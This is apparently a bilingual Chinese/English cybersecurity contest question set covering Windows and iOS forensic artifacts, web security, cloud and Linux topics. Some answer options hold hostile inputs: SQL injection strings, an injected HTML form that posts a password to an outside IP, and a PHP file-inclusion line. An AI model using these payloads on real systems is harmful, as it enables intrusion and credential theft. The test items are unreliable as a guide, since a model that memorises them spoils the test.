<h1 id="34-“参考-‘-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目"><a href="#34-“参考-‘-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目" class="headerlink" title="34    “参考 ‘ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目"></a>34    “参考 ‘ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>该计算机的操作系统于何时安装? (以计算机系统时区回答)<br>When was the operating system of this computer installed? (Answer in the time zone of the computer system)”    单选    A:2023-07-13 19:18:14;B:2023-07-13 11:18:14;C:2023-07-13 03:18:14;D:2023-07-12 19:18:14</p>
<h1 id="35-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目"><a href="#35-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目" class="headerlink" title="35    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目"></a>35    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>哪(几)个程序会于操作系统启动时自动执行?<br>Which program(s) would be automatically executed upon operating system startup?”    多选    A:Avast;B:Steam;C:OneDrive;D:QQ</p>
<h1 id="36-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目"><a href="#36-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目" class="headerlink" title="36    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目"></a>36    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>该计算机内安装了以下哪一个程序?<br>Which one of the following programs was installed on this computer?”    单选    A:QQ;B:WPS Office;C:Opera;D:Kaspersky</p>
<h1 id="37-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目"><a href="#37-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目" class="headerlink" title="37    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目"></a>37    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>计算机内的OneDrive程序版本是什么?<br>What is the version of the OneDrive program installed on this computer?”    填空    </p>
<h1 id="38-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目"><a href="#38-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目" class="headerlink" title="38    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目"></a>38    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>计算机有一个正在连接的网络接口，该接口连接DHCP服务器的IP地址是多少?<br>What is the IP address of DHCP server. ?</p>
<p>提示: 以 IPV4格式回答<br>Answer: Please answer in IPV4 format.”    填空    </p>
<h1 id="39-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目"><a href="#39-“参考’-Window-Artifacts-E01-‘内的Windows-注册表回答以下题目" class="headerlink" title="39    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目"></a>39    “参考’ Window Artifacts.E01 ‘内的Windows 注册表回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>该计算机何时连接过一只U盘? (以计算机系统时区回答)<br>When was a USB flash drive last connected to this computer? (Answer in the time zone of the computer system)”    单选    A:2023-07-13 11:48:26;B:2023-07-13 03:48:29;C:2023-07-12 19:48:29;D:2023-07-13 11:48:29</p>
<h1 id="40-“参考’-Window-Artifacts-E01-‘回答以下题目"><a href="#40-“参考’-Window-Artifacts-E01-‘回答以下题目" class="headerlink" title="40    “参考’ Window Artifacts.E01 ‘回答以下题目"></a>40    “参考’ Window Artifacts.E01 ‘回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>Elvis Chui 将哪几个文本文件放在回收站中?<br>Which text files did Elvis Chui put into the recycle bin?<br>“    多选    A:$+D10I76A74P.txt;B:Holiday schedule 2023-07-16.txt;C:Holiday schedule 2023-07-13.txt;D:Minute on 2023-07-01.txt;E: Minute on 2023-07-10.txt</p>
<h1 id="41-“参考’-Window-Artifacts-E01-‘-回答以下题目"><a href="#41-“参考’-Window-Artifacts-E01-‘-回答以下题目" class="headerlink" title="41    “参考’ Window Artifacts.E01 ‘ 回答以下题目"></a>41    “参考’ Window Artifacts.E01 ‘ 回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>Elvis Chui在什么时间删除了第一个文本文件? (以计算机系统时区回答)<br>What time did Elvis Chui delete the first text file? (Answer in the time zone of the computer system)<br>“    单选    A:2023-07-13 11:50:15;B:2023-07-13 03:49:45;C:2023-07-13 03:50:15;D:2023-07-13 11:49:45</p>
<h1 id="42-“参考-‘-Window-Artifacts-E01-‘回答以下题目"><a href="#42-“参考-‘-Window-Artifacts-E01-‘回答以下题目" class="headerlink" title="42    “参考 ‘ Window Artifacts.E01 ‘回答以下题目"></a>42    “参考 ‘ Window Artifacts.E01 ‘回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>Elvis Chui删除的第一个文本文件的文件名是什么?<br>What was the name of the first text file Elvis Chui deleted?</p>
<p>提示: 请用小写字母回答及需列明文件格式。如文件名字内有空格位置，请用<em>标示。例如: go_to_school.docx<br>Tips: Please use  lowercase to answer the questions and mention the file extension.  If a blank space is present, please use </em> to represent the blank space.  Example: go_to_school.docx”    填空    </p>
<h1 id="43-“参考-‘-Window-Artifacts-E01-‘-回答以下题目"><a href="#43-“参考-‘-Window-Artifacts-E01-‘-回答以下题目" class="headerlink" title="43    “参考 ‘ Window Artifacts.E01 ‘ 回答以下题目"></a>43    “参考 ‘ Window Artifacts.E01 ‘ 回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>Elvis Chui删除的第一个文本文件在什么时间创建? (以计算机系统时区回答)<br>When was the text file first deleted by Elvis was created? (Answer in the time zone of the computer system)</p>
<p>“    单选    A:2023-07-13_11:42:39;B:2023-07-13_11:50:49;C:2023-07-13_11:49:45;D:2023-07-13_11:45:22</p>
<h1 id="44-“参考-‘-Window-Artifacts-E01-‘-回答以下题目"><a href="#44-“参考-‘-Window-Artifacts-E01-‘-回答以下题目" class="headerlink" title="44    “参考 ‘ Window Artifacts.E01 ‘ 回答以下题目"></a>44    “参考 ‘ Window Artifacts.E01 ‘ 回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>Elvis Chui计划于2023年7月15日20点5分有什么活动?<br>What is Elvis Chui’s plan at 8:05 PM on July 15, 2023?</p>
<p>提示: 答案请与文件内的文字与大细阶相同<br>Tips: Please answer the exact words and uppercase/lowercase leters shown in the file”    填空    </p>
<h1 id="45-“参考-‘-Window-Artifacts-E01-‘-回答以下题目"><a href="#45-“参考-‘-Window-Artifacts-E01-‘-回答以下题目" class="headerlink" title="45    “参考 ‘ Window Artifacts.E01 ‘ 回答以下题目"></a>45    “参考 ‘ Window Artifacts.E01 ‘ 回答以下题目</h1><p>With reference to ‘ Window Artifacts.E01 ‘ file to answer below question</p>
<p>该计算机执行STEAM.EXE总共多少次?<br>How many times has STEAM.EXE been opened on this computer?</p>
<p>提示: 请用阿拉伯数字作答<br>Tips: Please answer in arabic numbers</p>
<p>“    填空    </p>
<h1 id="46-“一个名为“Account”的数据库表拥有5个””列””，以下哪一个指令会产生错误讯息"><a href="#46-“一个名为“Account”的数据库表拥有5个””列””，以下哪一个指令会产生错误讯息" class="headerlink" title="46    “一个名为“Account”的数据库表拥有5个””列””，以下哪一个指令会产生错误讯息?"></a>46    “一个名为“Account”的数据库表拥有5个””列””，以下哪一个指令会产生错误讯息?</h1><p>(提示: 1.数据库是拥有正常默认的系统表格 2.错误信息是关于””超出上限””的错误)<br>A database table called “Account” has 5 columns. Which of the following command will case an error message?<br>(Tips 1. database has default system tables 2. error message is related to “”Out of Range””.)<br>“    单选    A:SELECT <em> from Account WHERE name=‘Alex’ OR ‘1’=1;B:SELECT </em> FROM Account WHERE name=‘Bill’ UNION SELECT NULL, NULL, NULL, NULL; —;C:SELECT * from Account WHERE name=‘Candy’ ORDER BY 6; —;D:SELECT name FROM sys.tables</p>
<h1 id="47-“当客户端收到一个页面请求的HTTP状态代码为304时，以下哪种情况最有可能发生？"><a href="#47-“当客户端收到一个页面请求的HTTP状态代码为304时，以下哪种情况最有可能发生？" class="headerlink" title="47    “当客户端收到一个页面请求的HTTP状态代码为304时，以下哪种情况最有可能发生？"></a>47    “当客户端收到一个页面请求的HTTP状态代码为304时，以下哪种情况最有可能发生？</h1><p>When a client receives an HTTP Status Code of 304 for a page request, which of the following is most likely to take place?<br>“    单选    “A：页面将显示错误The page will display with errors;B：页面将从浏览器缓存中加载The page will be loaded from the browser cache;C：浏览器将显示“访问被拒绝”The browser will display an “Access Denied”;D：服务器将复位向客户端到另一个资源The server will redirect the client to another resource<br>“</p>
<h1 id="48-“在HTML注入攻击中，以下哪种情况最有可能出现？"><a href="#48-“在HTML注入攻击中，以下哪种情况最有可能出现？" class="headerlink" title="48    “在HTML注入攻击中，以下哪种情况最有可能出现？"></a>48    “在HTML注入攻击中，以下哪种情况最有可能出现？</h1><p>Which of the following would most likely be found in an HTML Injection attack?<br>“    单选    “A: <form action=“http://1.2.3.4/login.htm”>Password:<input type=“password” name=“pword”> </form>;B:<embed src=“http://demo.com/demo.swf”> </embed>;C: <script>alert(‘Correct’)</script>;D: &lt;?php include(“inc/” .$_GET[‘file’];?&gt;<br>“</p>
<h1 id="49-“如何预防HTML注入攻击？"><a href="#49-“如何预防HTML注入攻击？" class="headerlink" title="49    “如何预防HTML注入攻击？"></a>49    “如何预防HTML注入攻击？</h1><p>How to prevent HTML injection attacks?<br>“    单选    “A:密钥管理Key management;<br>B:同源策略执行Same Origin<br>Policy enforcement;C:会话验证Session validation;D:输入过滤Input sanitization<br>“</p>
<h1 id="50-“同源策略在浏览器内存中提供Web应用程序安全的目的是什么？"><a href="#50-“同源策略在浏览器内存中提供Web应用程序安全的目的是什么？" class="headerlink" title="50    “同源策略在浏览器内存中提供Web应用程序安全的目的是什么？"></a>50    “同源策略在浏览器内存中提供Web应用程序安全的目的是什么？</h1><p>What is the purpose of Same-Origin Policy in providing web application security in a browser’s memory?<br>“    单选    “A:防止客户端访问恶意网站Preventing the client from accessing a malicious site;B:禁止Web会话运行外部脚本Prohibiting a web session from running externally sourced scripts;C:控制来自不同服务器的代码之间的交互Controlling interactions between code from different servers;D:阻止浏览器运行危险或有害的脚本Stopping a browser from running dangerous or harmful scripts<br>“</p>
<h1 id="51-“编写Nmap命令以显示以下结果。"><a href="#51-“编写Nmap命令以显示以下结果。" class="headerlink" title="51    “编写Nmap命令以显示以下结果。"></a>51    “编写Nmap命令以显示以下结果。</h1><p>Write the Namp command that will show the following result</p>
<p>Starting Nmap 7.94 (<a href="https://nmap.org">https://nmap.org</a>) at 2023-07-11 18:26 中国标准时间<br>Nmap scan report for www.baidu.com (220.181.38.149)<br>Host is up (0.044s latency).<br>Other addresses for www.baidu.com (not scanned): 220.181.38.150</p>
<p>Not shown: 998 filtered tcp ports (no-response)<br>PORT          STATE            SERVICE<br>80/tcp           open                http<br>|  http-robots.txt: 10 disallowed entries<br>|  /baidu /s? /ulink? /link? /home/news/data/  /bh /shifen/<br>|<em>/homepage/  /cpro /<br>443/tcp     open             https<br>|  http-robots.txt: 10 disallowed entries<br>|  /baidu /s? /ulink? /link? /home/news/data/  /bh /shifen/<br>|</em>/homepage/  /cpro /</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 6.01 seconds</p>
<p>提示:请输入完整的Nmap指令，例如: nmap —script http-brute -p 80 www.google.com<br>Tips: Please input the complete nmap command.  Example: nmap —script http-brute -p 80 www.google.com”    填空    </p>
<h1 id="52-“除了使用Nmap，还有其他方法可以验证上述结果，其中一种方法是使用Web浏览器浏览URL，编写URL以显示上述结果。（答案不要包含“http-”）"><a href="#52-“除了使用Nmap，还有其他方法可以验证上述结果，其中一种方法是使用Web浏览器浏览URL，编写URL以显示上述结果。（答案不要包含“http-”）" class="headerlink" title="52    “除了使用Nmap，还有其他方法可以验证上述结果，其中一种方法是使用Web浏览器浏览URL，编写URL以显示上述结果。（答案不要包含“http://”）"></a>52    “除了使用Nmap，还有其他方法可以验证上述结果，其中一种方法是使用Web浏览器浏览URL，编写URL以显示上述结果。（答案不要包含“<a href="http://”）">http://”）</a></h1><p>Other than using Nmap, there are other methods which can verify the above result. One of the methods is using Web browser to surf the URL. Write the URL that will show the above result.<br>(Answer without “http://”)<br>“    填空    </p>
<h1 id="53-“参考’-IOS-‘-文件夹回答以下题目"><a href="#53-“参考’-IOS-‘-文件夹回答以下题目" class="headerlink" title="53    “参考’ IOS ‘ 文件夹回答以下题目"></a>53    “参考’ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ to answer below question</p>
<p>根据 ‘ com.apple.ios.StoreKitUIService.plist ‘ , 这部电话是什么型号?<br>According to ‘ com.apple.ios.StoreKitUIService.plist ‘, what is the model of this phone?”    单选    A:SAMSUNG S23;B:iPhone X;C:iPhone XR;D:iPhone XS;E:iPhone 13</p>
<h1 id="54-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#54-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="54    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>54    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ to answer below question</p>
<p>根据com.apple.ios.StoreKitUIService.plist，上述电话的文件系统是什么?<br>According to com.apple.ios.StoreKitUIService.plist, what is the file system of the phone in question?”    单选    A:FAT32;B:NTFS;C:HFS+;D:APFS;E:EXT4</p>
<h1 id="55-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#55-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="55    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>55    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据ChatStorage.sqlite，哪些对话已锁定?<br>According to ChatStorage.sqlite where chats are stored, which conversations are locked?</p>
<p>“    多选    A:447380449879@.whatsapp.net;B:79096209701@.whatsapp.net;C:923109725619@.whatsapp.net;D:85256026169@.whatsapp.net;E:status@broadcast</p>
<h1 id="56-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#56-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="56    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>56    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据ChatStorage.sqlite，有多少段录音对话?<br>According to ChatStorage.sqlite, how many recorded conversations are there?</p>
<p>提示: 请以阿拉伯数字作答<br>Tips: Please answer in arabic numbers.”    填空    </p>
<h1 id="57-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#57-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="57    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>57    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>Apple Cocoa Core Data timestamp 是由什么时间开始?<br>From what time does the Apple Cocoa Core Data timestamp start?”    单选    A:2001年1月1日;B:1970年1月1日;C:2006年1月1日;D:1960年1月1日</p>
<h1 id="58-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#58-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="58    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>58    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据Photos.sqlite数据库中，有多少段视频可能涉及WhatsApp?<br>According to the Photos.sqlite database, how many videos may be related to WhatsApp?</p>
<p>提示: 请以阿拉伯数字作答<br>Tips: Please answer in arabic numbers”    填空    </p>
<h1 id="59-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#59-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="59    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>59    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ to answer below question</p>
<p>根据Photos.sqlite数据库中，下列哪个选项对IMG_0008.HEIC的描述是错的?<br>According to the ‘ Photos.sqlite ‘ database, which of the following descriptions of IMG_0008.HEIC is incorrect?”    多选    A:由第三方软件拍摄;B:经过修改;C:由后镜拍摄;D:用ISO200拍摄;E:没有储存经纬度</p>
<h1 id="60-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#60-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="60    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>60    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据 ‘ sms(ios).db ‘ 的资料，全局唯一标识符(GUID): DD31C26F-1D72-DE0F-431E-EF98F104402D显示的信息是什么?<br>According to ‘ sms(ios).db ‘, what is the message shown on Globally Unique Identifier (GUID) of DD31C26F-1D72-DE0F-431E-EF98F104402D? </p>
<p>提示:答案需要与信息一样(答案包括中文字、阿拉伯数字与符号)<br>Tips: Answer should be same as the message (including Chinese words, arabic numbers and symols)”    填空    </p>
<h1 id="61-“参考-‘-IOS-‘-资料-夹回答以下题目"><a href="#61-“参考-‘-IOS-‘-资料-夹回答以下题目" class="headerlink" title="61    “参考 ‘ IOS ‘ 资料 夹回答以下题目"></a>61    “参考 ‘ IOS ‘ 资料 夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据 ‘ com.burbn.instagram.plist ‘ 及 ‘ com.facebook.Facebook.plist ‘<br>手机安装了实时通讯软件Facebook及Instagram的那个版本? (Instant Messaging Apps)?<br>According to ‘com.burbn.instagram.plist ‘ and ‘ com.facebook.Facebook.plist ‘, which version of instant messaging apps (Facebook and Instagram) are installed on the phone?”    多选    A:Instagram (Version 278.0.0.19.115);B:Facebook (Version 410.0.0.41.116);C:Instagram (Version 279.0.0.23.112);D: Facebook (Version 410.0.0.26.115);E: Instagram (Version 278.0.0.25.115);F: Facebook (Version 410.0.0.57.116)</p>
<h1 id="62-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#62-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="62    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>62    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据 ‘ ChatStorage(ios).sqlite ‘ , 用户数据Peter Chow (85262012141)在什么日期和时间(以UTC +8时区)曾经通过实时通讯软件送出一个信息(内容为: I am already home)? </p>
<p>According to ‘ ChatStorage(ios).sqlite ‘, on what day and time (in UTC+8 time zone) did Peter Chan (user information 85262012141) send a message via instant messaging? (Hint: Message Content: I am already home)</p>
<p>提示:以UTC +8时区作答,并以YYYY-MM-DD_HH:MM:SS格式作答<br>例如:2023-01-01_10:01:01 (答案无需输入UTC +8)<br>Tips: Please answer the question in UTC +8 timezone and use format YYYY-MM-DD_HH:MM:SS to answer.  Example: 2023-01-01_10:01:01”    填空    </p>
<h1 id="63-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#63-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="63    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>63    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据影片IMG_0687.MOV的原数据，找出影片拍摄时间?<br>According to original data of video IMG_0687.MOV, please find out the taping time?</p>
<p>提示:以UTC +8时区作答,并以YYYY-MM-DD_HH:MM:SS格式作答<br>例如:2023-01-01_10:01:01 (答案无需输入UTC +8)<br>Tips: Please answer the question in UTC +8 timezone and use format YYYY-MM-DD_HH:MM:SS to answer.  Example: 2023-01-01_10:01:01”    填空    </p>
<h1 id="64-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#64-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="64    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>64    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据 ‘ CallHistory(ios).storedata ‘，哪份表格显示了通话记录?<br>According to ‘ CallHistory(ios).storedata ‘,which table(s) containting the data of call record?”    单选    “A:    ZCALLBPROPERTIES;B:    ZCALLRECORD;C:    Z_2REMOTEPARTICIPANTHANDLES;D:    Z_METADATA;E:    Z_MODELCACHE;F:    Z_PRIMARYKEY</p>
<p>“</p>
<h1 id="65-“参考’-IOS-‘-文件夹回答以下题目"><a href="#65-“参考’-IOS-‘-文件夹回答以下题目" class="headerlink" title="65    “参考’ IOS ‘ 文件夹回答以下题目"></a>65    “参考’ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据 ‘ com.apple.sharingd.plist ‘，这部手机的隔空投送的身份标识号(AirDrop ID)是什么?<br>Accoding to ‘ com.apple.sharingd.plist ‘, What is AirDrop ID of the mobile phone?</p>
<p>提示:请以阿拉伯数字与小写字母作答<br>Tips: Please answer in arabic numbers and lowercase letters.”    填空    </p>
<h1 id="66-“参考-‘-IOS-‘-文件夹回答以下题目"><a href="#66-“参考-‘-IOS-‘-文件夹回答以下题目" class="headerlink" title="66    “参考 ‘ IOS ‘ 文件夹回答以下题目"></a>66    “参考 ‘ IOS ‘ 文件夹回答以下题目</h1><p>With reference to ‘ IOS ‘ folder to answer below question</p>
<p>根据 ‘ Accounts3.sqlite ‘，这部手机的苹果使用者账号 (Apple ID) 是什么?<br>According to  ‘ Accounts3.sqlite ‘, what is the Apple ID of this mobile phone?</p>
<p>提示:请以电邮格式作答(例:jack2023@hotmail.com)<br>Please answer in email format (Example: jasck2023@hotmail.com)”    填空    </p>
<h1 id="67-“哪一行代码的是负责更新在GitHub使用中的-journal-文件的更新历史记录"><a href="#67-“哪一行代码的是负责更新在GitHub使用中的-journal-文件的更新历史记录" class="headerlink" title="67    “哪一行代码的是负责更新在GitHub使用中的 .journal 文件的更新历史记录 ?"></a>67    “哪一行代码的是负责更新在GitHub使用中的 .journal 文件的更新历史记录 ?</h1><p>Which line of code in the script is responsible for updating GitHub with the updated history of the .journal file?</p>
<p>line 1 git config —global user.name “”mikesezto””<br>line 2 git config —global user.email “”smike@general.org””<br>line 3<br>line 4 cd which-truth<br>line 5 rm.journal<br>line 6<br>line 7 git add.journal<br>line 8 git commit -m “”Remove sensitive data””<br>line 9 git push<br>line 10<br>line 11 git clone —mirror <a href="http://github.com/smike/which-truth">http://github.com/smike/which-truth</a><br>line 12<br>line 13 java -jar bfg.jar —delete-files.journal which-truth<br>line 14 cd which-truth<br>line 15 git reflog expire —expire=now —all<br>line 16 git gc —prune=now —aggressive<br>line 17 git push —force<br>“    单选    A. 08;B. 13;C. 16;D. 17</p>
<h1 id="68-“下列哪一行AWS-S3-Bucket授权策略中的设置有问题"><a href="#68-“下列哪一行AWS-S3-Bucket授权策略中的设置有问题" class="headerlink" title="68    “下列哪一行AWS S3 Bucket授权策略中的设置有问题?"></a>68    “下列哪一行AWS S3 Bucket授权策略中的设置有问题?</h1><p>Which line of setting in the following AWS bucket policy statement is in question?<br>line 1 {<br>line 2   “”Version””: “”2020-11-12””,<br>line 3   “”Statement””: [<br>line 4       {<br>line 5         “”Sid””: “”PublicReadGetObject””,<br>line 6         “”Effect””: “”Allow””,<br>line 7         “”Principal””: “”<em>“”,<br>line 8         “”Action””: “”s3:GetObject””,<br>line 9         “”Resource””: “”arn:aws:s3:::company-sensitive-14dnid23nfief/</em>“”<br>line 10     }<br>line 11   ]<br>line 12 }</p>
<p>“    单选    A. 2;B. 7;C. 8;D. 9</p>
<h1 id="69-“以下哪项是多重身份验证-MFA-的示例"><a href="#69-“以下哪项是多重身份验证-MFA-的示例" class="headerlink" title="69    “以下哪项是多重身份验证 (MFA) 的示例"></a>69    “以下哪项是多重身份验证 (MFA) 的示例</h1><p>Which of the following is an example of multi-factor authentication (MFA)?<br>“    单选    “A. PIN 码和软件令牌 PIN and software token;B. 指纹和视网膜扫描 fingerprint and retinal scan;C. 用户名和密码username and password;D. 一次性短信代码和硬件令牌one-time SMS code and a hardware token<br>“</p>
<h1 id="70-“AWS用家在户口网络进行设定，而这些设定会记录用户或第三者的活动。第-11-行代码中的设定可以找到哪些用户或第三者的活动信息？"><a href="#70-“AWS用家在户口网络进行设定，而这些设定会记录用户或第三者的活动。第-11-行代码中的设定可以找到哪些用户或第三者的活动信息？" class="headerlink" title="70    “AWS用家在户口网络进行设定，而这些设定会记录用户或第三者的活动。第 11 行代码中的设定可以找到哪些用户或第三者的活动信息？"></a>70    “AWS用家在户口网络进行设定，而这些设定会记录用户或第三者的活动。第 11 行代码中的设定可以找到哪些用户或第三者的活动信息？</h1><p>An AWS user is setting up his AWS account.  Those setting will record the activities of the user or third party.  What user or third party information could be found in line 11 of code in the script ? </p>
<p>line 1  sudo yum install python-pip -y<br>line 2  sudo pip install opencanary<br>line 3<br>line 4  sudo opencanaryd —copyconfig<br>line 5<br>line 6  opencanaryd —start<br>line 7<br>line 8<br>line 9  sudo yun install jq -y<br>line 10<br>line 11  jq -r .src_host /var/tmp/opencanary.log | grep -V ^$ | sort | uniq &gt; -/sources.txt<br>line 12  jq -r .logdata.USERNAME /var/tmp/opencanary.log | grep -V null | sort | uniq &gt; -/usernames.txt<br>line 13  jq -r .logdata.PASSWORD /var/tmp/opencanary.log | grep -V null | sort | uniq &gt; -/passwords.txt</p>
<p>“    单选    A. User Name  用户的名称;B. User Source  用户的来源;C. Attacker Name  攻击者的名称;D. Attacker Source  攻击者的来源</p>
<h1 id="71-“AWS用户设置了一个VPC，IP地址范围为10-0-0-0-10-0-0-24。-下列哪个-IP-地址用于-DNS"><a href="#71-“AWS用户设置了一个VPC，IP地址范围为10-0-0-0-10-0-0-24。-下列哪个-IP-地址用于-DNS" class="headerlink" title="71    “AWS用户设置了一个VPC，IP地址范围为10.0.0.0-10.0.0.24。 下列哪个 IP 地址用于 DNS ?"></a>71    “AWS用户设置了一个VPC，IP地址范围为10.0.0.0-10.0.0.24。 下列哪个 IP 地址用于 DNS ?</h1><p>An AWS user sets a VPC with IP address space of 10.0.0.0-10.0.0.24，Which of the following IP address is used for DNS?<br>“    单选    A. 10.0.0.0;B. 10.0.0.1;C. 10.0.0.2;D. 10.0.0.3</p>
<h1 id="72-“以下哪种类型的云服务用于操作系统和网络"><a href="#72-“以下哪种类型的云服务用于操作系统和网络" class="headerlink" title="72    “以下哪种类型的云服务用于操作系统和网络 ?"></a>72    “以下哪种类型的云服务用于操作系统和网络 ?</h1><p>Which of the following type of Cloud service is used for operating systems and network?<br>“    单选    “A. 软件即服务Software as a Service;B. 平台即服务Platform as a Service;C. 基础架构即服务 Infrasture as a Service;D. 数据即服务 Data as a Service<br>“</p>
<h1 id="73-“以下哪项是Bastionhost的特点？"><a href="#73-“以下哪项是Bastionhost的特点？" class="headerlink" title="73    “以下哪项是Bastionhost的特点？"></a>73    “以下哪项是Bastionhost的特点？</h1><p>What is the feature of a bastionhost?<br>“    单选    “A. 包含敏感信息 Contains sensitive information;B. 无法访问内部系统 No access to internal systems;C. 限制暴露的服务 Limits exposed services;D. 没有连接到互联网 No connection to the internet<br>“</p>
<h1 id="74-“在Linux系统中，哪个命令可以用于创建文件系统？"><a href="#74-“在Linux系统中，哪个命令可以用于创建文件系统？" class="headerlink" title="74    “在Linux系统中，哪个命令可以用于创建文件系统？"></a>74    “在Linux系统中，哪个命令可以用于创建文件系统？</h1><p>In Linux system, which command can be used to create file system ?<br>“    单选    A:mount /dev/sda3 /mnt/usb;B:mkfs-ext4 /dev/sda2;C:mkfs-ext3 /sys/sda1;D:pvcreate /dev/sda;C:genfstab -U -p /mnt</p>
<h1 id="75-“‘Link’实际上是指向LINUX系统中另一个文件或文件夹的指标。以下哪个命令可以产生下面的结果"><a href="#75-“‘Link’实际上是指向LINUX系统中另一个文件或文件夹的指标。以下哪个命令可以产生下面的结果" class="headerlink" title="75    “‘Link’实际上是指向LINUX系统中另一个文件或文件夹的指标。以下哪个命令可以产生下面的结果:"></a>75    “‘Link’实际上是指向LINUX系统中另一个文件或文件夹的指标。以下哪个命令可以产生下面的结果:</h1><p>A link is actually a pointer to another file or folder in the Linux system.  Which of the following command can generate below result?</p>
<blockquote>
<p>ls -ilas<br>|total 0<br>|9731253 0 drwxr-xr-x 1 user users 4096 Jul 14 13:31 .<br>|1725961 0 drwxr-xr-x 1 user users 4096 Jul 14 13:29 ..<br>|90371467 0 -rw-r—r— 2 user users 90 Jul 14 13:30 testing.txt<br>|90371467 0 -rw-r—r— 2 user users 90 Jul 14 13:30 shotcut-testing.txt<br>“    单选    A:link -s testing.txt shotcut-testing.txt;B:ln -s shotcut.txt testing.txt;C:ln testing.txt shotcut-testing.txt;D:ln -s testing.txt shotcut-testing.txt;E:ln shotcut.txt testing.txt</p>
